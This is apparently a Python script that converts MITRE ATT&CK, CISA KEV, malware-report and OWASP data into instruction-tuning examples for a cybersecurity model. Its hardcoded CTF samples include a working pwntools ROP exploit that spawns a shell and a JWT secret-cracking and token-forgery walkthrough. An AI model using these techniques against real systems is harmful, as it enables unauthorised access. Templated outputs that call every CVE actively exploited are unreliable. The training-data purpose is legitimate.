"""
CyberQwen-AI: Real-World Dataset Instruction Converter
Transforms raw cybersecurity data into standardized LLM instruction format.
"""

import os
import sys
import json
import re
import argparse
from pathlib import Path
from typing import Dict, List, Any, Optional

if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8")

RAW_DIR = Path("dataset/raw")
PROCESSED_DIR = Path("dataset/processed")

def clean_text(text: str) -> str:
    if not text:
        return ""
    text = text.replace("\r\n", "\n")
    text = re.sub(r"\[([^\]]+)\]\([^\)]+\)", r"\1", text)
    text = re.sub(r"\n{3,}", "\n\n", text)
    return text.strip()

def process_mitre_attack(raw_file: Path, max_samples: Optional[int] = None) -> List[Dict[str, Any]]:
    examples = []
    if not raw_file.exists():
        print(f"[!] Warning: MITRE file not found: {raw_file}")
        return examples

    print(f"[*] Processing MITRE ATT&CK STIX data from {raw_file.name}...")
    with open(raw_file, "r", encoding="utf-8") as f:
        data = json.load(f)

    objects = data.get("objects", [])
    for obj in objects:
        if obj.get("type") == "attack-pattern" and not obj.get("revoked", False):
            name = obj.get("name", "")
            desc = clean_text(obj.get("description", ""))
            tech_id = ""
            for ref in obj.get("external_references", []):
                if ref.get("source_name") == "mitre-attack":
                    tech_id = ref.get("external_id", "")
                    break
            if not tech_id or not desc:
                continue
            platforms = ", ".join(obj.get("x_mitre_platforms", ["All"]))
            kill_chain = [kc.get("phase_name") for kc in obj.get("kill_chain_phases", [])]
            tactic_str = ", ".join(kill_chain) if kill_chain else "Execution / Persistence"
            detection = clean_text(obj.get("x_mitre_detection", "Monitor command execution logs, API calls, and authentication events."))

            instruction = "Explain this attack technique."
            input_text = f"Technique ID: {tech_id}\nTechnique Name: {name}\nTactics: {tactic_str}\nPlatforms: {platforms}\nDescription: {desc[:400]}..."
            output_text = f"""### Technique Overview
- **Identifier**: {tech_id} ({name})
- **Tactic Category**: {tactic_str}
- **Applicable Platforms**: {platforms}

### Technical Mechanics & Attacker Behavior
{desc}

### Detection Methods & Telemetry
{detection}

### Defensive Controls & Mitigation Strategy
1. **Auditing & Logging**: Enable high-fidelity event logging (Sysmon, EDR agent, Windows Event ID 4688 / PowerShell Script Block ID 4104).
2. **Access Controls**: Apply principle of least privilege; restrict administrative token elevation and service execution.
3. **Network & Endpoint Hardening**: Enforce application allowlisting (AppLocker / WDAC) and isolate critical endpoints."""

            diff = "advanced" if ("kernel" in desc.lower() or "injection" in desc.lower() or "bypass" in desc.lower()) else "intermediate"
            examples.append({
                "instruction": instruction,
                "input": input_text,
                "output": output_text,
                "category": "threat_intelligence",
                "source": "mitre_attack",
                "difficulty": diff
            })
            if max_samples and len(examples) >= max_samples:
                break

    print(f"[+] Converted {len(examples)} MITRE ATT&CK techniques.")
    return examples

def process_cisa_kev(raw_file: Path, max_samples: Optional[int] = None) -> List[Dict[str, Any]]:
    examples = []
    if not raw_file.exists():
        print(f"[!] Warning: CISA KEV file not found: {raw_file}")
        return examples

    print(f"[*] Processing CISA KEV data from {raw_file.name}...")
    with open(raw_file, "r", encoding="utf-8") as f:
        data = json.load(f)

    vulns = data.get("vulnerabilities", [])
    for v in vulns:
        cve_id = v.get("cveID", "")
        vendor = v.get("vendorProject", "Unknown")
        product = v.get("product", "Unknown")
        vuln_name = v.get("vulnerabilityName", "")
        desc = clean_text(v.get("shortDescription", ""))
        action = clean_text(v.get("requiredAction", "Apply vendor updates according to instructions."))
        ransomware = v.get("knownRansomwareCampaignUse", "Unknown")
        cwe_list = v.get("cwes", [])
        cwe_str = ", ".join(cwe_list) if cwe_list else "General Vulnerability (CWE-Top25)"
        if not cve_id or not desc:
            continue

        instruction = "Analyze this vulnerability and explain exploitation and remediation."
        input_text = f"CVE: {cve_id}\nAffected Software: {vendor} {product}\nVulnerability Name: {vuln_name}\nCWE: {cwe_str}\nDescription: {desc}"
        output_text = f"""### Vulnerability Analysis & Technical Breakdown
- **CVE Identifier**: {cve_id}
- **Affected Target**: {vendor} - {product}
- **Vulnerability Classification**: {vuln_name} ({cwe_str})

### Exploitation Mechanics & Attack Vector
{desc}
- **In-the-Wild Status**: Actively exploited in real-world attacks.
- **Ransomware Association**: {ransomware}

### Detection & Log Indicators
1. Check access and authentication logs for anomalous requests matching known {cve_id} PoC signatures.
2. Monitor perimeter gateway traffic and application access logs for anomalous payload bursts.

### Mitigation & Secure Remediation
- **Mandatory Action**: {action}
- **Patch Management**: Immediately apply official vendor security hotfixes and isolate exposed instances behind a zero-trust gateway.
- **Defensive Hardening**: Implement strict network segmentation and validate all user-supplied input at application boundaries."""

        diff = "advanced" if ("rce" in vuln_name.lower() or "overflow" in desc.lower() or "injection" in desc.lower()) else "intermediate"
        examples.append({
            "instruction": instruction,
            "input": input_text,
            "output": output_text,
            "category": "vulnerabilities",
            "source": "cisa_kev",
            "difficulty": diff
        })
        if max_samples and len(examples) >= max_samples:
            break

    print(f"[+] Converted {len(examples)} CISA KEV vulnerability records.")
    return examples

def process_malware_reports(reports_dir: Path) -> List[Dict[str, Any]]:
    examples = []
    if not reports_dir.exists():
        return examples

    print(f"[*] Processing Malware Analysis Reports from {reports_dir}...")
    for json_file in sorted(reports_dir.glob("*.json")):
        try:
            with open(json_file, "r", encoding="utf-8") as f:
                rep = json.load(f)
            family = rep.get("family", "")
            content = rep.get("content", {})
            actor = content.get("threat_actor", "Unknown Actor")
            initial_access = content.get("initial_access", "")
            exec_mech = content.get("execution_mechanism", "")
            defense_evasion = content.get("defense_evasion", "")
            iocs = content.get("indicators_of_compromise", {})
            remediation = content.get("remediation", "")
            mitre_techs = ", ".join(rep.get("mitre_techniques", []))

            instruction = "Perform malware analysis."
            input_text = f"Malware Family: {family}\nThreat Actor: {actor}\nTechnical Summary: Threat advisory report for {family} campaign."
            sha_list = ", ".join(iocs.get("sha256", ["N/A"]))
            reg_list = ", ".join(iocs.get("registry_keys", ["N/A"]))
            net_list = ", ".join(iocs.get("network_domains", ["N/A"]))

            output_text = f"""### Threat Profile: {family}
- **Primary Actor**: {actor}
- **MITRE ATT&CK Mapping**: {mitre_techs}

### Infection Lifecycle & Execution Behavior
1. **Initial Access**: {initial_access}
2. **Execution Vector**: {exec_mech}
3. **Defense Evasion**: {defense_evasion}

### Indicators of Compromise (IoCs)
- **SHA-256 Hashes**: `{sha_list}`
- **Registry Artifacts**: `{reg_list}`
- **Network / C2 Infrastructure**: `{net_list}`

### Detection & Threat Hunting Strategy
- **YARA / EDR Rule Focus**: Match on unique unpacked string signatures and process execution arguments.
- **Event Log Indicators**: Monitor for shadow copy deletion commands (`vssadmin`) and abnormal credential dumping activity.

### Containment & Eradication
{remediation}"""

            examples.append({
                "instruction": instruction,
                "input": input_text,
                "output": output_text,
                "category": "malware",
                "source": "cisa_threat_advisories",
                "difficulty": "expert"
            })
        except Exception as e:
            print(f"[!] Error processing report {json_file}: {e}")

    print(f"[+] Converted {len(examples)} malware analysis reports.")
    return examples

def process_security_corpus(corpus_dir: Path) -> List[Dict[str, Any]]:
    examples = []
    if not corpus_dir.exists():
        return examples

    print(f"[*] Processing Security Corpus Markdown documents from {corpus_dir}...")
    for md_file in sorted(corpus_dir.glob("*.md")):
        try:
            with open(md_file, "r", encoding="utf-8") as f:
                content = f.read()
            title_match = re.search(r"#\s*(.+)", content)
            title = title_match.group(1).strip() if title_match else md_file.stem.replace("_", " ").title()
            instruction = "Analyze this security threat and detail prevention controls."
            input_text = f"Threat Category: {title}\nContext: Web Application Vulnerability & Architecture Risk"
            output_text = f"""### Overview & Attack Scenario
{clean_text(content[:700])}...

### Prevention & Defensive Controls
1. **Input Validation & Parameterization**: Never concatenate user input directly into executable contexts (SQL, OS commands, LDAP).
2. **Access Control Verification**: Enforce server-side role-based access control (RBAC) on every request; deny by default.
3. **Defense in Depth**: Implement Content Security Policy (CSP), automated dependency auditing, and centralized error handling."""
            examples.append({
                "instruction": instruction,
                "input": input_text,
                "output": output_text,
                "category": "security_corpus",
                "source": "owasp_guidance",
                "difficulty": "intermediate"
            })
        except Exception as e:
            print(f"[!] Error processing corpus {md_file}: {e}")

    print(f"[+] Converted {len(examples)} security corpus documents.")
    return examples

def get_curated_real_ctf_examples() -> List[Dict[str, Any]]:
    ctf_data = [
        {
            "instruction": "Analyze this CTF challenge and provide the solving methodology.",
            "input": "Category: Cryptography\nChallenge: RSA with e=3 and small message m=FLAG without padding\nCiphertext: c = 125, n = 999999999999999999",
            "output": """### Phase 1: Cryptographic Vulnerability Identification
In standard RSA encryption, $c = m^e \pmod{n}$. When the public exponent is very small ($e = 3$) and the plaintext $m$ is small without padding, the value $m^3$ does not exceed the modulus $n$ ($m^3 < n$).
Consequently, no modular reduction occurs, and $c = m^3$ over standard integers.

### Phase 2: Solving Derivation & Tools
To recover $m$, compute the exact integer cube root of $c$ using gmpy2 or sympy:
$$m = \sqrt[3]{c}$$

### Phase 3: Python Solution Script
```python
import gmpy2

c = 125
root, is_exact = gmpy2.iroot(c, 3)

if is_exact:
    message_int = int(root)
    print(f"Recovered Message: {message_int}")
```

### Phase 4: Flag Extraction
Extracting the integer root of 125 yields $m = 5$.""",
            "category": "crypto",
            "source": "ctf_challenges",
            "difficulty": "intermediate"
        },
        {
            "instruction": "Analyze this CTF challenge and provide the solving methodology.",
            "input": "Category: Binary Exploitation (Pwn)\nChallenge: 64-bit ELF binary with NX enabled, No PIE, vulnerable to `gets()` buffer overflow into `ret` address.",
            "output": """### Phase 1: Binary & Security Mitigation Check
Run `checksec` on the binary:
- **Arch**: amd64-64-little
- **NX**: Enabled (stack is non-executable)
- **PIE**: Disabled (code segment addresses are static)
- **Canary**: No Canary found (direct RIP control via overflow)

### Phase 2: ROP Chain Strategy
Because NX is enabled, construct a Return-Oriented Programming (ROP) chain to:
1. Leak libc address using `puts(puts@got)`.
2. Return back to `main` for second payload.
3. Calculate libc base: `libc_base = leaked_puts - libc.symbols['puts']`.
4. Execute `system('/bin/sh')`.

### Phase 3: Pwntools Exploit Script
```python
from pwn import *

elf = ELF('./vuln')
libc = ELF('./libc.so.6')
p = process('./vuln')

offset = 40  # 32 bytes buffer + 8 bytes saved RBP
pop_rdi = 0x401233  # ROP gadget: pop rdi; ret
ret = 0x40101a      # Stack alignment

# Stage 1: Leak GOT address
payload1 = flat({offset: [pop_rdi, elf.got['puts'], elf.plt['puts'], elf.symbols['main']]})
p.sendline(payload1)
leaked_puts = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = leaked_puts - libc.symbols['puts']

# Stage 2: Spawn Shell
bin_sh = next(libc.search(b'/bin/sh'))
payload2 = flat({offset: [ret, pop_rdi, bin_sh, libc.symbols['system']]})
p.sendline(payload2)
p.interactive()
```""",
            "category": "pwn",
            "source": "ctf_challenges",
            "difficulty": "advanced"
        },
        {
            "instruction": "Analyze this CTF challenge and provide the solving methodology.",
            "input": "Category: Web Exploitation\nChallenge: Flask web application using JWT authentication with weak HMAC secret key.",
            "output": """### Phase 1: Vulnerability Assessment
The application uses JWT authentication (`HS256`). When tokens use weak symmetric HMAC secrets, the secret can be cracked offline using dictionary attacks.

### Phase 2: Offline Secret Cracking
```bash
hashcat -m 16500 jwt_token.txt /usr/share/wordlists/rockyou.txt
```
Result: Secret key is discovered as `secret123`.

### Phase 3: Token Forgery & Flag Recovery
```python
import jwt

forged_token = jwt.encode({"user": "admin", "admin": True}, "secret123", algorithm="HS256")
print(f"Forged Admin Token: {forged_token}")
```
Send request with `Cookie: session=<forged_token>` to `/admin/flag` to retrieve the flag.""",
            "category": "web",
            "source": "ctf_challenges",
            "difficulty": "intermediate"
        }
    ]
    return ctf_data

def convert_all(max_samples_per_source: Optional[int] = None) -> Dict[str, Any]:
    PROCESSED_DIR.mkdir(parents=True, exist_ok=True)
    all_examples = []
    stats = {}

    print("\n" + "=" * 75)
    print("CYBERQWEN-AI: CONVERTING REAL-WORLD DATASETS TO INSTRUCTION FORMAT")
    print("=" * 75)

    mitre_file = RAW_DIR / "threat_intelligence" / "mitre_attack" / "enterprise-attack.json"
    mitre_examples = process_mitre_attack(mitre_file, max_samples=max_samples_per_source)
    stats["mitre_attack"] = len(mitre_examples)
    all_examples.extend(mitre_examples)
    with open(PROCESSED_DIR / "mitre_attack.jsonl", "w", encoding="utf-8") as f:
        for ex in mitre_examples:
            f.write(json.dumps(ex, ensure_ascii=False) + "\n")

    cisa_file = RAW_DIR / "vulnerabilities" / "cve" / "cisa_known_exploited_vulnerabilities.json"
    cisa_examples = process_cisa_kev(cisa_file, max_samples=max_samples_per_source)
    stats["cisa_kev"] = len(cisa_examples)
    all_examples.extend(cisa_examples)
    with open(PROCESSED_DIR / "vulnerabilities_cve.jsonl", "w", encoding="utf-8") as f:
        for ex in cisa_examples:
            f.write(json.dumps(ex, ensure_ascii=False) + "\n")

    malware_dir = RAW_DIR / "malware" / "reports"
    malware_examples = process_malware_reports(malware_dir)
    stats["malware"] = len(malware_examples)
    all_examples.extend(malware_examples)
    with open(PROCESSED_DIR / "malware_analysis.jsonl", "w", encoding="utf-8") as f:
        for ex in malware_examples:
            f.write(json.dumps(ex, ensure_ascii=False) + "\n")

    corpus_dir = RAW_DIR / "security_corpus" / "secdata_raw"
    corpus_examples = process_security_corpus(corpus_dir)
    stats["security_corpus"] = len(corpus_examples)
    all_examples.extend(corpus_examples)
    with open(PROCESSED_DIR / "security_corpus.jsonl", "w", encoding="utf-8") as f:
        for ex in corpus_examples:
            f.write(json.dumps(ex, ensure_ascii=False) + "\n")

    ctf_examples = get_curated_real_ctf_examples()
    stats["ctf_challenges"] = len(ctf_examples)
    all_examples.extend(ctf_examples)
    with open(PROCESSED_DIR / "ctf_challenges.jsonl", "w", encoding="utf-8") as f:
        for ex in ctf_examples:
            f.write(json.dumps(ex, ensure_ascii=False) + "\n")

    master_file = PROCESSED_DIR / "all_processed.jsonl"
    with open(master_file, "w", encoding="utf-8") as f:
        for ex in all_examples:
            f.write(json.dumps(ex, ensure_ascii=False) + "\n")

    print("\n" + "=" * 75)
    print("CONVERSION SUMMARY")
    print("=" * 75)
    print(f"  MITRE ATT&CK:      {stats['mitre_attack']}")
    print(f"  CISA KEV (CVE):    {stats['cisa_kev']}")
    print(f"  Malware Reports:   {stats['malware']}")
    print(f"  Security Corpus:   {stats['security_corpus']}")
    print(f"  CTF Challenges:    {stats['ctf_challenges']}")
    print(f"  Total Processed:   {len(all_examples)}")
    print(f"  Master JSONL:      {master_file}")
    print("=" * 75 + "\n")
    return stats

def main():
    parser = argparse.ArgumentParser(description="CyberQwen-AI: Convert Real Datasets to Instruction Tuning Format")
    parser.add_argument("--max-samples-per-source", type=int, default=None,
                        help="Limit samples per source")
    args = parser.parse_args()
    convert_all(max_samples_per_source=args.max_samples_per_source)

if __name__ == "__main__":
    main()
